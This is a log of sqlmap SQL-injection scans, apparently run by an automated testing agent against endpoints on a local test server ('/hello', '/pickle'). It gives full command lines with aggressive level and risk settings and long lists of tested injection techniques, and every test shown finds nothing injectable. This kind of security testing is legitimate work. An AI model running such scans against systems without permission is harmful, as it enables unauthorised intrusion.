2025-09-26 18:55:12,187 - INFO - [18:55:12] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
2025-09-26 18:55:12,253 - INFO - [18:55:12] [INFO] testing 'Generic inline queries'
2025-09-26 18:55:12,295 - INFO - [18:55:12] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
2025-09-26 18:55:12,300 - INFO - [18:55:12] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
2025-09-26 18:55:12,358 - INFO - [18:55:12] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
2025-09-26 18:55:12,398 - INFO - [18:55:12] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
2025-09-26 18:55:12,457 - INFO - [18:55:12] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
2025-09-26 18:55:12,515 - INFO - [18:55:12] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
2025-09-26 18:55:12,572 - INFO - [18:55:12] [INFO] testing 'Oracle AND time-based blind'
2025-09-26 18:55:12,637 - INFO - it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
2025-09-26 18:55:12,637 - INFO - [18:55:12] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
2025-09-26 18:55:12,715 - INFO - [18:55:12] [WARNING] URI parameter '#1*' does not seem to be injectable
2025-09-26 18:55:12,715 - INFO - [18:55:12] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
2025-09-26 18:55:12,715 - INFO - [18:55:12] [WARNING] HTTP error codes detected during run:
2025-09-26 18:55:12,719 - INFO - 404 (Not Found) - 73 times
2025-09-26 18:55:12,719 - INFO - 
2025-09-26 18:55:12,721 - INFO - [*] ending @ 18:55:12 /2025-09-26/
2025-09-26 18:55:12,721 - INFO - 

-------------------- EXECUTING COMMAND --------------------
'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' --batch --flush-session -u http://localhost:5000/hello
--------------------------------------------------
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.9.9.4#dev}
|_ -| . ["]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:55:08 /2025-09-26/

[18:55:11] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
do you want to try URI injections in the target URL itself? [Y/n/q] Y
[18:55:11] [INFO] flushing session file
[18:55:11] [INFO] testing connection to the target URL
[18:55:11] [INFO] checking if the target is protected by some kind of WAF/IPS
[18:55:11] [INFO] testing if the target URL content is stable
[18:55:11] [INFO] target URL content is stable
[18:55:11] [INFO] testing if URI parameter '#1*' is dynamic
[18:55:11] [WARNING] URI parameter '#1*' does not appear to be dynamic
[18:55:11] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
[18:55:11] [INFO] testing for SQL injection on URI parameter '#1*'
[18:55:11] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:55:11] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[18:55:12] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:55:12] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[18:55:12] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[18:55:12] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[18:55:12] [INFO] testing 'Generic inline queries'
[18:55:12] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[18:55:12] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[18:55:12] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[18:55:12] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[18:55:12] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[18:55:12] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[18:55:12] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[18:55:12] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[18:55:12] [WARNING] URI parameter '#1*' does not seem to be injectable
[18:55:12] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
[18:55:12] [WARNING] HTTP error codes detected during run:
404 (Not Found) - 73 times

[*] ending @ 18:55:12 /2025-09-26/

2025-09-26 18:55:12,859 - INFO - Flushed sqlmap session for http://localhost:5000/hello (log: attack-logs-dynamic\Hello_flush.log)
2025-09-26 18:55:12,859 - INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u 'http://localhost:5000/hello?name=test' --output-dir 'attack-logs-dynamic\Hello_sqlmap' --batch --level=5 --risk=3 --threads 5 -p name --technique BU
2025-09-26 18:55:16,280 - INFO -         ___
2025-09-26 18:55:16,280 - INFO -        __H__
2025-09-26 18:55:16,280 - INFO -  ___ ___["]_____ ___ ___  {1.9.9.4#dev}
2025-09-26 18:55:16,280 - INFO - |_ -| . [,]     | .'| . |
2025-09-26 18:55:16,280 - INFO - |___|_  [']_|_|_|__,|  _|
2025-09-26 18:55:16,280 - INFO -       |_|V...       |_|   https://sqlmap.org
2025-09-26 18:55:16,280 - INFO - 
2025-09-26 18:55:16,306 - INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
2025-09-26 18:55:16,306 - INFO - 
2025-09-26 18:55:16,306 - INFO - [*] starting @ 18:55:16 /2025-09-26/
2025-09-26 18:55:16,306 - INFO - 
2025-09-26 18:55:18,146 - INFO - [18:55:18] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Hello_sqlmap' as the output directory
2025-09-26 18:55:18,686 - INFO - [18:55:18] [INFO] testing connection to the target URL
2025-09-26 18:55:18,773 - INFO - [18:55:18] [INFO] checking if the target is protected by some kind of WAF/IPS
2025-09-26 18:55:18,804 - INFO - [18:55:18] [INFO] testing if the target URL content is stable
2025-09-26 18:55:19,195 - INFO - [18:55:19] [INFO] target URL content is stable
2025-09-26 18:55:19,297 - INFO - [18:55:19] [WARNING] heuristic (basic) test shows that GET parameter 'name' might not be injectable
2025-09-26 18:55:19,324 - INFO - [18:55:19] [INFO] heuristic (XSS) test shows that GET parameter 'name' might be vulnerable to cross-site scripting (XSS) attacks
2025-09-26 18:55:19,324 - INFO - [18:55:19] [INFO] testing for SQL injection on GET parameter 'name'
2025-09-26 18:55:19,453 - INFO - [18:55:19] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
2025-09-26 18:55:19,463 - INFO - [18:55:19] [WARNING] reflective value(s) found and filtering out
2025-09-26 18:55:20,675 - INFO - [18:55:20] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
2025-09-26 18:55:21,747 - INFO - [18:55:21] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
2025-09-26 18:55:22,873 - INFO - [18:55:22] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 18:55:23,819 - INFO - [18:55:23] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 18:55:24,423 - INFO - [18:55:24] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 18:55:24,654 - INFO - [18:55:24] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 18:55:24,877 - INFO - [18:55:24] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
2025-09-26 18:55:25,141 - INFO - [18:55:25] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
2025-09-26 18:55:25,634 - INFO - [18:55:25] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
2025-09-26 18:55:26,168 - INFO - [18:55:26] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
2025-09-26 18:55:26,683 - INFO - [18:55:26] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
2025-09-26 18:55:27,190 - INFO - [18:55:27] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
2025-09-26 18:55:27,683 - INFO - [18:55:27] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
2025-09-26 18:55:28,627 - INFO - [18:55:28] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
2025-09-26 18:55:29,601 - INFO - [18:55:29] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
2025-09-26 18:55:30,509 - INFO - [18:55:30] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
2025-09-26 18:55:31,469 - INFO - [18:55:31] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
2025-09-26 18:55:32,256 - INFO - [18:55:32] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 18:55:33,262 - INFO - [18:55:33] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 18:55:34,105 - INFO - [18:55:34] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
2025-09-26 18:55:35,299 - INFO - [18:55:35] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
2025-09-26 18:55:36,122 - INFO - [18:55:36] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
2025-09-26 18:55:37,686 - INFO - [18:55:37] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
2025-09-26 18:55:39,123 - INFO - [18:55:39] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
2025-09-26 18:55:40,782 - INFO - [18:55:40] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
2025-09-26 18:55:42,029 - INFO - [18:55:42] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
2025-09-26 18:55:42,084 - INFO - [18:55:42] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
2025-09-26 18:55:42,152 - INFO - [18:55:42] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
2025-09-26 18:55:42,195 - INFO - [18:55:42] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
2025-09-26 18:55:42,242 - INFO - [18:55:42] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
2025-09-26 18:55:42,289 - INFO - [18:55:42] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
2025-09-26 18:55:42,328 - INFO - [18:55:42] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
2025-09-26 18:55:42,373 - INFO - [18:55:42] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
2025-09-26 18:55:42,417 - INFO - [18:55:42] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
2025-09-26 18:55:42,456 - INFO - [18:55:42] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
2025-09-26 18:55:42,514 - INFO - [18:55:42] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
2025-09-26 18:55:42,558 - INFO - [18:55:42] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
2025-09-26 18:55:42,600 - INFO - [18:55:42] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
2025-09-26 18:55:42,633 - INFO - [18:55:42] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
2025-09-26 18:55:42,679 - INFO - [18:55:42] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
2025-09-26 18:55:42,735 - INFO - [18:55:42] [INFO] testing 'Informix boolean-based blind - Parameter replace'
2025-09-26 18:55:42,780 - INFO - [18:55:42] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
2025-09-26 18:55:42,817 - INFO - [18:55:42] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
2025-09-26 18:55:42,872 - INFO - [18:55:42] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
2025-09-26 18:55:42,921 - INFO - [18:55:42] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
2025-09-26 18:55:42,963 - INFO - [18:55:42] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
2025-09-26 18:55:42,995 - INFO - [18:55:42] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
2025-09-26 18:55:43,043 - INFO - [18:55:43] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
2025-09-26 18:55:43,081 - INFO - [18:55:43] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:55:43,155 - INFO - [18:55:43] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:55:43,241 - INFO - [18:55:43] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:55:43,241 - INFO - [18:55:43] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:55:43,241 - INFO - [18:55:43] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:55:43,325 - INFO - [18:55:43] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
2025-09-26 18:55:43,389 - INFO - [18:55:43] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
2025-09-26 18:55:43,458 - INFO - [18:55:43] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
2025-09-26 18:55:43,526 - INFO - [18:55:43] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
2025-09-26 18:55:43,606 - INFO - [18:55:43] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:55:43,672 - INFO - [18:55:43] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:55:43,747 - INFO - [18:55:43] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:55:43,804 - INFO - [18:55:43] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:55:43,881 - INFO - [18:55:43] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:55:43,936 - INFO - [18:55:43] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:55:43,996 - INFO - [18:55:43] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
2025-09-26 18:55:44,061 - INFO - [18:55:44] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
2025-09-26 18:55:44,127 - INFO - [18:55:44] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
2025-09-26 18:55:45,145 - INFO - [18:55:45] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
2025-09-26 18:55:45,823 - INFO - [18:55:45] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
2025-09-26 18:55:45,839 - INFO - [18:55:45] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
2025-09-26 18:55:46,530 - INFO - [18:55:46] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
2025-09-26 18:55:47,267 - INFO - [18:55:47] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
2025-09-26 18:55:47,950 - INFO - [18:55:47] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
2025-09-26 18:55:48,640 - INFO - [18:55:48] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
2025-09-26 18:55:49,451 - INFO - [18:55:49] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
2025-09-26 18:55:50,141 - INFO - [18:55:50] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
2025-09-26 18:55:50,829 - INFO - it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
2025-09-26 18:55:50,830 - INFO - [18:55:50] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
2025-09-26 18:55:51,420 - INFO - [18:55:51] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
2025-09-26 18:55:51,904 - INFO - [18:55:51] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
2025-09-26 18:55:52,351 - INFO - [18:55:52] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
2025-09-26 18:55:52,840 - INFO - [18:55:52] [WARNING] GET parameter 'name' does not seem to be injectable
2025-09-26 18:55:52,840 - INFO - [18:55:52] [CRITICAL] all tested parameters do not appear to be injectable. Rerun without providing the option '--technique'. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
2025-09-26 18:55:52,840 - INFO - 
2025-09-26 18:55:52,840 - INFO - [*] ending @ 18:55:52 /2025-09-26/
2025-09-26 18:55:52,840 - INFO - 

-------------------- EXECUTING COMMAND --------------------
'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u 'http://localhost:5000/hello?name=test' --output-dir 'attack-logs-dynamic\Hello_sqlmap' --batch --level=5 --risk=3 --threads 5 -p name --technique BU
--------------------------------------------------
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.9.9.4#dev}
|_ -| . [,]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:55:16 /2025-09-26/

[18:55:18] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Hello_sqlmap' as the output directory
[18:55:18] [INFO] testing connection to the target URL
[18:55:18] [INFO] checking if the target is protected by some kind of WAF/IPS
[18:55:18] [INFO] testing if the target URL content is stable
[18:55:19] [INFO] target URL content is stable
[18:55:19] [WARNING] heuristic (basic) test shows that GET parameter 'name' might not be injectable
[18:55:19] [INFO] heuristic (XSS) test shows that GET parameter 'name' might be vulnerable to cross-site scripting (XSS) attacks
[18:55:19] [INFO] testing for SQL injection on GET parameter 'name'
[18:55:19] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:55:19] [WARNING] reflective value(s) found and filtering out
[18:55:20] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[18:55:21] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[18:55:22] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[18:55:23] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[18:55:24] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[18:55:24] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[18:55:24] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[18:55:25] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[18:55:25] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[18:55:26] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[18:55:26] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[18:55:27] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[18:55:27] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[18:55:28] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[18:55:29] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[18:55:30] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[18:55:31] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[18:55:32] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:55:33] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:55:34] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[18:55:35] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[18:55:36] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[18:55:37] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[18:55:39] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
[18:55:40] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
[18:55:42] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[18:55:42] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[18:55:42] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
[18:55:42] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[18:55:42] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[18:55:42] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[18:55:42] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[18:55:42] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[18:55:42] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[18:55:42] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[18:55:42] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[18:55:42] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
[18:55:42] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
[18:55:42] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
[18:55:42] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
[18:55:42] [INFO] testing 'Informix boolean-based blind - Parameter replace'
[18:55:42] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
[18:55:42] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
[18:55:42] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
[18:55:42] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[18:55:42] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[18:55:42] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[18:55:43] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[18:55:43] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[18:55:43] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:55:43] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[18:55:43] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:55:43] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[18:55:43] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
[18:55:43] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
[18:55:43] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
[18:55:43] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
[18:55:43] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
[18:55:43] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:55:43] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
[18:55:43] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:55:43] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
[18:55:43] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:55:43] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
[18:55:44] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
[18:55:44] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[18:55:45] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
[18:55:45] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
[18:55:45] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
[18:55:46] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
[18:55:47] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
[18:55:47] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
[18:55:48] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
[18:55:49] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
[18:55:50] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[18:55:50] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[18:55:51] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[18:55:51] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
[18:55:52] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
[18:55:52] [WARNING] GET parameter 'name' does not seem to be injectable
[18:55:52] [CRITICAL] all tested parameters do not appear to be injectable. Rerun without providing the option '--technique'. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'

[*] ending @ 18:55:52 /2025-09-26/

2025-09-26 18:55:53,071 - INFO - No clear injection detected during discovery for http://localhost:5000/hello
2025-09-26 18:55:53,072 - INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' --batch --flush-session -u http://localhost:5000/pickle --data test=1
2025-09-26 18:55:57,056 - INFO -         ___
2025-09-26 18:55:57,056 - INFO -        __H__
2025-09-26 18:55:57,056 - INFO -  ___ ___[,]_____ ___ ___  {1.9.9.4#dev}
2025-09-26 18:55:57,056 - INFO - |_ -| . [(]     | .'| . |
2025-09-26 18:55:57,056 - INFO - |___|_  [,]_|_|_|__,|  _|
2025-09-26 18:55:57,056 - INFO -       |_|V...       |_|   https://sqlmap.org
2025-09-26 18:55:57,056 - INFO - 
2025-09-26 18:55:57,093 - INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
2025-09-26 18:55:57,093 - INFO - 
2025-09-26 18:55:57,108 - INFO - [*] starting @ 18:55:57 /2025-09-26/
2025-09-26 18:55:57,108 - INFO - 
